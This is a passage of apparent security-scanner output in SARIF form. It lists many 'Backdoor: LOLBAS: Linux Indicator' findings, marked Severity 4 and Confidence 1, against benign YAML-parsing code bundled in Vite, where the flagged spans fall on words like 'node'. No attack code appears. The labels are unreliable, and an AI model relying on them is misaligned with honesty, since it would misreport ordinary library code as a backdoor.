                      "markdown": "`    }\n    const coll = resolveCollection(CN, ctx, token, onError, tagName, tag);\n    const res = tag.resolve?.(coll, msg => onError(tagToken, 'TAG_RESOLVE_FAILED', msg), ctx.options) ?? coll;\n    const node = isNode$1(res)\n        ? res\n        : new Scalar(res);\n    node.range = coll.range;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 30278,
                  "startColumn": 41,
                  "endLine": 30278,
                  "endColumn": 45,
                  "snippet": {
                    "text": "        ? null\n        : ctx.directives.tagName(tagToken.source, msg => onError(tagToken, 'TAG_RESOLVE_FAILED', msg));\n    if (token.type === 'block-seq') {\n        const { anchor, newlineAfterProp: nl } = props;\n        const lastProp = anchor && tagToken\n            ? anchor.offset > tagToken.offset\n                ? anchor\n",
                    "rendered": {
                      "text": "        ? null\n        : ctx.directives.tagName(tagToken.source, msg => onError(tagToken, 'TAG_RESOLVE_FAILED', msg));\n    if (token.type === 'block-seq') {\n        const { anchor, newlineAfterProp: nl } = props;\n        const lastProp = anchor && tagToken\n            ? anchor.offset > tagToken.offset\n                ? anchor\n",
                      "markdown": "`        ? null\n        : ctx.directives.tagName(tagToken.source, msg => onError(tagToken, 'TAG_RESOLVE_FAILED', msg));\n    if (token.type === 'block-seq') {\n        const { anchor, newlineAfterProp: nl } = props;\n        const lastProp = anchor && tagToken\n            ? anchor.offset > tagToken.offset\n                ? anchor\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 30056,
                  "startColumn": 77,
                  "endLine": 30056,
                  "endColumn": 83,
                  "snippet": {
                    "text": "                    hasSpace = true;\n                    break;\n                default:\n                    onError(token, 'UNEXPECTED_TOKEN', `Unexpected ${type} at node end`);\n            }\n            offset += source.length;\n        }\n",
                    "rendered": {
                      "text": "                    hasSpace = true;\n                    break;\n                default:\n                    onError(token, 'UNEXPECTED_TOKEN', `Unexpected ${type} at node end`);\n            }\n            offset += source.length;\n        }\n",
                      "markdown": "`                    hasSpace = true;\n                    break;\n                default:\n                    onError(token, 'UNEXPECTED_TOKEN', `Unexpected ${type} at node end`);\n            }\n            offset += source.length;\n        }\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 30016,
                  "startColumn": 13,
                  "endLine": 30016,
                  "endColumn": 19,
                  "snippet": {
                    "text": "                continue;\n            }\n        }\n        const node = value\n            ? composeNode(ctx, value, props, onError)\n            : composeEmptyNode(ctx, props.end, start, null, props, onError);\n        if (ctx.schema.compat)\n",
                    "rendered": {
                      "text": "                continue;\n            }\n        }\n        const node = value\n            ? composeNode(ctx, value, props, onError)\n            : composeEmptyNode(ctx, props.end, start, null, props, onError);\n        if (ctx.schema.compat)\n",
                      "markdown": "`                continue;\n            }\n        }\n        const node = value\n            ? composeNode(ctx, value, props, onError)\n            : composeEmptyNode(ctx, props.end, start, null, props, onError);\n        if (ctx.schema.compat)\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 29757,
                  "startColumn": 54,
                  "endLine": 29757,
                  "endColumn": 60,
                  "snippet": {
                    "text": "                break;\n            case 'tag': {\n                if (tag)\n                    onError(token, 'MULTIPLE_TAGS', 'A node can have at most one tag');\n                tag = token;\n                if (start === null)\n                    start = token.offset;\n",
                    "rendered": {
                      "text": "                break;\n            case 'tag': {\n                if (tag)\n                    onError(token, 'MULTIPLE_TAGS', 'A node can have at most one tag');\n                tag = token;\n                if (start === null)\n                    start = token.offset;\n",
                      "markdown": "`                break;\n            case 'tag': {\n                if (tag)\n                    onError(token, 'MULTIPLE_TAGS', 'A node can have at most one tag');\n                tag = token;\n                if (start === null)\n                    start = token.offset;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 29745,
                  "startColumn": 57,
                  "endLine": 29745,
                  "endColumn": 63,
                  "snippet": {
                    "text": "                break;\n            case 'anchor':\n                if (anchor)\n                    onError(token, 'MULTIPLE_ANCHORS', 'A node can have at most one anchor');\n                if (token.source.endsWith(':'))\n                    onError(token.offset + token.source.length - 1, 'BAD_ALIAS', 'Anchor ending in : is ambiguous', true);\n                anchor = token;\n",
                    "rendered": {
                      "text": "                break;\n            case 'anchor':\n                if (anchor)\n                    onError(token, 'MULTIPLE_ANCHORS', 'A node can have at most one anchor');\n                if (token.source.endsWith(':'))\n                    onError(token.offset + token.source.length - 1, 'BAD_ALIAS', 'Anchor ending in : is ambiguous', true);\n                anchor = token;\n",
                      "markdown": "`                break;\n            case 'anchor':\n                if (anchor)\n                    onError(token, 'MULTIPLE_ANCHORS', 'A node can have at most one anchor');\n                if (token.source.endsWith(':'))\n                    onError(token.offset + token.source.length - 1, 'BAD_ALIAS', 'Anchor ending in : is ambiguous', true);\n                anchor = token;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 29423,
                  "startColumn": 13,
                  "endLine": 29423,
                  "endColumn": 19,
                  "snippet": {
                    "text": "            schema: this.schema,\n            sourceObjects\n        };\n        const node = createNode(value, tag, ctx);\n        if (flow && isCollection$1(node))\n            node.flow = true;\n        setAnchors();\n",
                    "rendered": {
                      "text": "            schema: this.schema,\n            sourceObjects\n        };\n        const node = createNode(value, tag, ctx);\n        if (flow && isCollection$1(node))\n            node.flow = true;\n        setAnchors();\n",
                      "markdown": "`            schema: this.schema,\n            sourceObjects\n        };\n        const node = createNode(value, tag, ctx);\n        if (flow && isCollection$1(node))\n            node.flow = true;\n        setAnchors();\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 28909,
                  "startColumn": 14,
                  "endLine": 28909,
                  "endColumn": 20,
                  "snippet": {
                    "text": "    format: 'HEX',\n    test: /^[-+]?0x[0-9a-fA-F_]+$/,\n    resolve: (str, _onError, opt) => intResolve(str, 2, 16, opt),\n    stringify: node => intStringify(node, 16, '0x')\n};\n\nclass YAMLSet extends YAMLMap {\n",
                    "rendered": {
                      "text": "    format: 'HEX',\n    test: /^[-+]?0x[0-9a-fA-F_]+$/,\n    resolve: (str, _onError, opt) => intResolve(str, 2, 16, opt),\n    stringify: node => intStringify(node, 16, '0x')\n};\n\nclass YAMLSet extends YAMLMap {\n",
                      "markdown": "`    format: 'HEX',\n    test: /^[-+]?0x[0-9a-fA-F_]+$/,\n    resolve: (str, _onError, opt) => intResolve(str, 2, 16, opt),\n    stringify: node => intStringify(node, 16, '0x')\n};\n\nclass YAMLSet extends YAMLMap {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 28892,
                  "startColumn": 14,
                  "endLine": 28892,
                  "endColumn": 20,
                  "snippet": {
                    "text": "    format: 'OCT',\n    test: /^[-+]?0[0-7_]+$/,\n    resolve: (str, _onError, opt) => intResolve(str, 1, 8, opt),\n    stringify: node => intStringify(node, 8, '0')\n};\nconst int = {\n    identify: intIdentify,\n",
                    "rendered": {
                      "text": "    format: 'OCT',\n    test: /^[-+]?0[0-7_]+$/,\n    resolve: (str, _onError, opt) => intResolve(str, 1, 8, opt),\n    stringify: node => intStringify(node, 8, '0')\n};\nconst int = {\n    identify: intIdentify,\n",
                      "markdown": "`    format: 'OCT',\n    test: /^[-+]?0[0-7_]+$/,\n    resolve: (str, _onError, opt) => intResolve(str, 1, 8, opt),\n    stringify: node => intStringify(node, 8, '0')\n};\nconst int = {\n    identify: intIdentify,\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 28883,
                  "startColumn": 14,
                  "endLine": 28883,
                  "endColumn": 20,
                  "snippet": {
                    "text": "    format: 'BIN',\n    test: /^[-+]?0b[0-1_]+$/,\n    resolve: (str, _onError, opt) => intResolve(str, 2, 2, opt),\n    stringify: node => intStringify(node, 2, '0b')\n};\nconst intOct = {\n    identify: intIdentify,\n",
                    "rendered": {
                      "text": "    format: 'BIN',\n    test: /^[-+]?0b[0-1_]+$/,\n    resolve: (str, _onError, opt) => intResolve(str, 2, 2, opt),\n    stringify: node => intStringify(node, 2, '0b')\n};\nconst intOct = {\n    identify: intIdentify,\n",
                      "markdown": "`    format: 'BIN',\n    test: /^[-+]?0b[0-1_]+$/,\n    resolve: (str, _onError, opt) => intResolve(str, 2, 2, opt),\n    stringify: node => intStringify(node, 2, '0b')\n};\nconst intOct = {\n    identify: intIdentify,\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 28832,
                  "startColumn": 13,
                  "endLine": 28832,
                  "endColumn": 19,
                  "snippet": {
                    "text": "    tag: 'tag:yaml.org,2002:float',\n    test: /^[-+]?(?:[0-9][0-9_]*)?\\.[0-9_]*$/,\n    resolve(str) {\n        const node = new Scalar(parseFloat(str.replace(/_/g, '')));\n        const dot = str.indexOf('.');\n        if (dot !== -1) {\n            const f = str.substring(dot + 1).replace(/_/g, '');\n",
                    "rendered": {
                      "text": "    tag: 'tag:yaml.org,2002:float',\n    test: /^[-+]?(?:[0-9][0-9_]*)?\\.[0-9_]*$/,\n    resolve(str) {\n        const node = new Scalar(parseFloat(str.replace(/_/g, '')));\n        const dot = str.indexOf('.');\n        if (dot !== -1) {\n            const f = str.substring(dot + 1).replace(/_/g, '');\n",
                      "markdown": "`    tag: 'tag:yaml.org,2002:float',\n    test: /^[-+]?(?:[0-9][0-9_]*)?\\.[0-9_]*$/,\n    resolve(str) {\n        const node = new Scalar(parseFloat(str.replace(/_/g, '')));\n        const dot = str.indexOf('.');\n        if (dot !== -1) {\n            const f = str.substring(dot + 1).replace(/_/g, '');\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 28504,
                  "startColumn": 14,
                  "endLine": 28504,
                  "endColumn": 20,
                  "snippet": {
                    "text": "    format: 'HEX',\n    test: /^0x[0-9a-fA-F]+$/,\n    resolve: (str, _onError, opt) => intResolve$1(str, 2, 16, opt),\n    stringify: node => intStringify$1(node, 16, '0x')\n};\n\nconst schema$2 = [\n",
                    "rendered": {
                      "text": "    format: 'HEX',\n    test: /^0x[0-9a-fA-F]+$/,\n    resolve: (str, _onError, opt) => intResolve$1(str, 2, 16, opt),\n    stringify: node => intStringify$1(node, 16, '0x')\n};\n\nconst schema$2 = [\n",
                      "markdown": "`    format: 'HEX',\n    test: /^0x[0-9a-fA-F]+$/,\n    resolve: (str, _onError, opt) => intResolve$1(str, 2, 16, opt),\n    stringify: node => intStringify$1(node, 16, '0x')\n};\n\nconst schema$2 = [\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 28487,
                  "startColumn": 14,
                  "endLine": 28487,
                  "endColumn": 20,
                  "snippet": {
                    "text": "    format: 'OCT',\n    test: /^0o[0-7]+$/,\n    resolve: (str, _onError, opt) => intResolve$1(str, 2, 8, opt),\n    stringify: node => intStringify$1(node, 8, '0o')\n};\nconst int$1 = {\n    identify: intIdentify$2,\n",
                    "rendered": {
                      "text": "    format: 'OCT',\n    test: /^0o[0-7]+$/,\n    resolve: (str, _onError, opt) => intResolve$1(str, 2, 8, opt),\n    stringify: node => intStringify$1(node, 8, '0o')\n};\nconst int$1 = {\n    identify: intIdentify$2,\n",
                      "markdown": "`    format: 'OCT',\n    test: /^0o[0-7]+$/,\n    resolve: (str, _onError, opt) => intResolve$1(str, 2, 8, opt),\n    stringify: node => intStringify$1(node, 8, '0o')\n};\nconst int$1 = {\n    identify: intIdentify$2,\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 28463,
                  "startColumn": 13,
                  "endLine": 28463,
                  "endColumn": 19,
                  "snippet": {
                    "text": "    tag: 'tag:yaml.org,2002:float',\n    test: /^[-+]?(?:\\.[0-9]+|[0-9]+\\.[0-9]*)$/,\n    resolve(str) {\n        const node = new Scalar(parseFloat(str));\n        const dot = str.indexOf('.');\n        if (dot !== -1 && str[str.length - 1] === '0')\n            node.minFractionDigits = str.length - dot - 1;\n",
                    "rendered": {
                      "text": "    tag: 'tag:yaml.org,2002:float',\n    test: /^[-+]?(?:\\.[0-9]+|[0-9]+\\.[0-9]*)$/,\n    resolve(str) {\n        const node = new Scalar(parseFloat(str));\n        const dot = str.indexOf('.');\n        if (dot !== -1 && str[str.length - 1] === '0')\n            node.minFractionDigits = str.length - dot - 1;\n",
                      "markdown": "`    tag: 'tag:yaml.org,2002:float',\n    test: /^[-+]?(?:\\.[0-9]+|[0-9]+\\.[0-9]*)$/,\n    resolve(str) {\n        const node = new Scalar(parseFloat(str));\n        const dot = str.indexOf('.');\n        if (dot !== -1 && str[str.length - 1] === '0')\n            node.minFractionDigits = str.length - dot - 1;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 28199,
                  "startColumn": 13,
                  "endLine": 28199,
                  "endColumn": 19,
                  "snippet": {
                    "text": "    }\n    get(key, keepScalar) {\n        const it = findPair(this.items, key);\n        const node = it?.value;\n        return (!keepScalar && isScalar$1(node) ? node.value : node) ?? undefined;\n    }\n    has(key) {\n",
                    "rendered": {
                      "text": "    }\n    get(key, keepScalar) {\n        const it = findPair(this.items, key);\n        const node = it?.value;\n        return (!keepScalar && isScalar$1(node) ? node.value : node) ?? undefined;\n    }\n    has(key) {\n",
                      "markdown": "`    }\n    get(key, keepScalar) {\n        const it = findPair(this.items, key);\n        const node = it?.value;\n        return (!keepScalar && isScalar$1(node) ? node.value : node) ?? undefined;\n    }\n    has(key) {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 27919,
                  "startColumn": 18,
                  "endLine": 27919,
                  "endColumn": 24,
                  "snippet": {
                    "text": "    if (isNode$1(key) && ctx?.doc) {\n        const strCtx = createStringifyContext(ctx.doc, {});\n        strCtx.anchors = new Set();\n        for (const node of ctx.anchors.keys())\n            strCtx.anchors.add(node.anchor);\n        strCtx.inFlow = true;\n        strCtx.inStringifyKey = true;\n",
                    "rendered": {
                      "text": "    if (isNode$1(key) && ctx?.doc) {\n        const strCtx = createStringifyContext(ctx.doc, {});\n        strCtx.anchors = new Set();\n        for (const node of ctx.anchors.keys())\n            strCtx.anchors.add(node.anchor);\n        strCtx.inFlow = true;\n        strCtx.inStringifyKey = true;\n",
                      "markdown": "`    if (isNode$1(key) && ctx?.doc) {\n        const strCtx = createStringifyContext(ctx.doc, {});\n        strCtx.anchors = new Set();\n        for (const node of ctx.anchors.keys())\n            strCtx.anchors.add(node.anchor);\n        strCtx.inFlow = true;\n        strCtx.inStringifyKey = true;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 27664,
                  "startColumn": 9,
                  "endLine": 27664,
                  "endColumn": 15,
                  "snippet": {
                    "text": "        }\n    }\n    let tagObj = undefined;\n    const node = isNode$1(item)\n        ? item\n        : ctx.doc.createNode(item, { onTagObj: o => (tagObj = o) });\n    if (!tagObj)\n",
                    "rendered": {
                      "text": "        }\n    }\n    let tagObj = undefined;\n    const node = isNode$1(item)\n        ? item\n        : ctx.doc.createNode(item, { onTagObj: o => (tagObj = o) });\n    if (!tagObj)\n",
                      "markdown": "`        }\n    }\n    let tagObj = undefined;\n    const node = isNode$1(item)\n        ? item\n        : ctx.doc.createNode(item, { onTagObj: o => (tagObj = o) });\n    if (!tagObj)\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 27067,
                  "startColumn": 17,
                  "endLine": 27067,
                  "endColumn": 23,
                  "snippet": {
                    "text": "            this.set(key, value);\n        }\n        else {\n            const node = this.get(key, true);\n            if (isCollection$1(node))\n                node.setIn(rest, value);\n            else if (node === undefined && this.schema)\n",
                    "rendered": {
                      "text": "            this.set(key, value);\n        }\n        else {\n            const node = this.get(key, true);\n            if (isCollection$1(node))\n                node.setIn(rest, value);\n            else if (node === undefined && this.schema)\n",
                      "markdown": "`            this.set(key, value);\n        }\n        else {\n            const node = this.get(key, true);\n            if (isCollection$1(node))\n                node.setIn(rest, value);\n            else if (node === undefined && this.schema)\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 27054,
                  "startColumn": 13,
                  "endLine": 27054,
                  "endColumn": 19,
                  "snippet": {
                    "text": "        const [key, ...rest] = path;\n        if (rest.length === 0)\n            return this.has(key);\n        const node = this.get(key, true);\n        return isCollection$1(node) ? node.hasIn(rest) : false;\n    }\n    /**\n",
                    "rendered": {
                      "text": "        const [key, ...rest] = path;\n        if (rest.length === 0)\n            return this.has(key);\n        const node = this.get(key, true);\n        return isCollection$1(node) ? node.hasIn(rest) : false;\n    }\n    /**\n",
                      "markdown": "`        const [key, ...rest] = path;\n        if (rest.length === 0)\n            return this.has(key);\n        const node = this.get(key, true);\n        return isCollection$1(node) ? node.hasIn(rest) : false;\n    }\n    /**\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 27027,
                  "startColumn": 13,
                  "endLine": 27027,
                  "endColumn": 19,
                  "snippet": {
                    "text": "     */\n    getIn(path, keepScalar) {\n        const [key, ...rest] = path;\n        const node = this.get(key, true);\n        if (rest.length === 0)\n            return !keepScalar && isScalar$1(node) ? node.value : node;\n        else\n",
                    "rendered": {
                      "text": "     */\n    getIn(path, keepScalar) {\n        const [key, ...rest] = path;\n        const node = this.get(key, true);\n        if (rest.length === 0)\n            return !keepScalar && isScalar$1(node) ? node.value : node;\n        else\n",
                      "markdown": "`     */\n    getIn(path, keepScalar) {\n        const [key, ...rest] = path;\n        const node = this.get(key, true);\n        if (rest.length === 0)\n            return !keepScalar && isScalar$1(node) ? node.value : node;\n        else\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 27014,
                  "startColumn": 13,
                  "endLine": 27014,
                  "endColumn": 19,
                  "snippet": {
                    "text": "        const [key, ...rest] = path;\n        if (rest.length === 0)\n            return this.delete(key);\n        const node = this.get(key, true);\n        if (isCollection$1(node))\n            return node.deleteIn(rest);\n        else\n",
                    "rendered": {
                      "text": "        const [key, ...rest] = path;\n        if (rest.length === 0)\n            return this.delete(key);\n        const node = this.get(key, true);\n        if (isCollection$1(node))\n            return node.deleteIn(rest);\n        else\n",
                      "markdown": "`        const [key, ...rest] = path;\n        if (rest.length === 0)\n            return this.delete(key);\n        const node = this.get(key, true);\n        if (isCollection$1(node))\n            return node.deleteIn(rest);\n        else\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 26997,
                  "startColumn": 17,
                  "endLine": 26997,
                  "endColumn": 23,
                  "snippet": {
                    "text": "            this.add(value);\n        else {\n            const [key, ...rest] = path;\n            const node = this.get(key, true);\n            if (isCollection$1(node))\n                node.addIn(rest, value);\n            else if (node === undefined && this.schema)\n",
                    "rendered": {
                      "text": "            this.add(value);\n        else {\n            const [key, ...rest] = path;\n            const node = this.get(key, true);\n            if (isCollection$1(node))\n                node.addIn(rest, value);\n            else if (node === undefined && this.schema)\n",
                      "markdown": "`            this.add(value);\n        else {\n            const [key, ...rest] = path;\n            const node = this.get(key, true);\n            if (isCollection$1(node))\n                node.addIn(rest, value);\n            else if (node === undefined && this.schema)\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 26922,
                  "startColumn": 9,
                  "endLine": 26922,
                  "endColumn": 15,
                  "snippet": {
                    "text": "        onTagObj(tagObj);\n        delete ctx.onTagObj;\n    }\n    const node = tagObj?.createNode\n        ? tagObj.createNode(ctx.schema, value, ctx)\n        : typeof tagObj?.nodeClass?.from === 'function'\n            ? tagObj.nodeClass.from(ctx.schema, value, ctx)\n",
                    "rendered": {
                      "text": "        onTagObj(tagObj);\n        delete ctx.onTagObj;\n    }\n    const node = tagObj?.createNode\n        ? tagObj.createNode(ctx.schema, value, ctx)\n        : typeof tagObj?.nodeClass?.from === 'function'\n            ? tagObj.nodeClass.from(ctx.schema, value, ctx)\n",
                      "markdown": "`        onTagObj(tagObj);\n        delete ctx.onTagObj;\n    }\n    const node = tagObj?.createNode\n        ? tagObj.createNode(ctx.schema, value, ctx)\n        : typeof tagObj?.nodeClass?.from === 'function'\n            ? tagObj.nodeClass.from(ctx.schema, value, ctx)\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
